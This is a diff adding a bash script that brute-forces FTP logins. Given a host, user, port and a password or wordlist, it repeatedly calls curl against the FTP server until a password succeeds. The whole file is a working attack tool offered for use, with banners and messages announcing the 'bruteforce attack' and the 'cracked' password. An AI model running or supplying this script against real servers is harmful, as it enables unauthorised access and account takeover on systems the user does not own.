@@ -1,0 +1,117 @@
+#!/bin/bash
+# Author: wuseman <wuseman@nr1.nu>
+# Created: 2012-08-02
+# Version: 1.0
+# License. GPL v3.0
+
+banner() {
+cat << "EOF"
+      ___
+     |   |
+    _|___|_
+     (* *)
+    __)#(__
+   ( )...( )(_)             Author: wuseman
+   || |_| ||//              Version: 1.0
+>==() | | ()/
+    _(___)_
+   [-]   [-]
+=====================================================
+EOF
+}
+
+
+usage() {
+banner
+cat << EOF
+
+    ./$basename$0 -[option] [optarg]
+
+       -h|--host          | Hostname
+       -u|--user          | Login user
+       -p|--port          | Port number
+       -w|--wordlist      | Wordlist file
+       -P|--password      | Password
+
+EOF
+}
+
+if [[ -z $1 ]]; then
+usage
+exit 1
+fi
+which ftp &> /dev/null
+if [[ $? -eq "1" ]]; then 
+         printf "%s\n" "You must install \e[1;1mftp\e[0m package before you can attack by this method, aborted\n"
+         exit 
+fi
+
+while getopts ":h:u:p:w:P:" ftpcracker; do
+  case $ftpcracker in
+      h) h=${OPTARG} ;;
+      u) u=${OPTARG} ;;
+      p) p=${OPTARG} ;;
+      w) w=${OPTARG} ;;
+      P) P=${OPTARG} ;;
+  esac
+done
+
+if [[ -z $h ]]; then
+      banner
+      echo -e "$basename$0: internal error -- you forgot hostname or ip\n"
+      exit 1
+elif [[ -z $u ]]; then
+      banner
+      echo -e "$basename$0: internal error -- you forgot username\n"
+      exit 1
+elif [[ -z $p ]]; then
+      banner
+      echo -e "$basename$0: internal error -- you forgot port number\n"
+      exit 1
+elif [[ -z $w && -z $P ]]; then
+      banner
+      echo -e "$basename$0: internal error -- you forgot to choose a password or a wordlist\n"
+      exit 1
+else
+     sleep 0
+fi
+
+if [[ -z $1 ]]; then
+  banner
+  usage
+elif [[ -n $P ]]; then
+        banner
+	ftpbrute=$(curl -su $u:$P ftp://$h:$p)
+        if [[ -n $ftpbrute ]]; then
+		echo -e "Correct login for \e[1;1m$u\e[0m: password: \e[1;32m$P\e[0m\e[0m"
+                echo -e ""
+		exit 0
+	fi
+		printf "\nNo luck this time, \e[1;31m$P\e[0m is wrong password for \e[1;1m$u\e[0m\n\n"
+elif [[ -n $w ]]; then
+re='^[0-9]+$'
+if ! [[ $p =~ $re ]];then echo "That's not a valid port, aborted" >&2; exit 1;fi
+if [[ -z $w ]]; then echo "You must enter a a wordlist";exit 0;fi
+if [[ ! -f $w ]];then echo "Can't find $w, aborted"; exit 0;fi
+banner
+printf "Bruteforce attack will be started within 2 seconds..\n"
+printf "Please use (CTRL+C) to abort the attack at anytime..\n"
+printf "=====================================================\n"
+sleep 2
+while read line; do
+ftpbrute=$(curl -su $u:$line ftp://$h:$p)
+if [[ $? -eq "0"  ]]; then
+echo -e "====================================================="
+echo -e "Password Has Been Cracked For \e[1;1m$u\e[0m: \e[1;32m$line\e[0m"
+echo -e "=====================================================\n"
+exit 0
+else
+echo -e "Wrong password for $user: \e[1;31m$line\e[0m"
+fi
+done < $w
+echo -e "====================================================="
+echo -e "No password matched \e[1m$u\e[0m password.."
+echo -e "=====================================================\n"
+fi
+
+
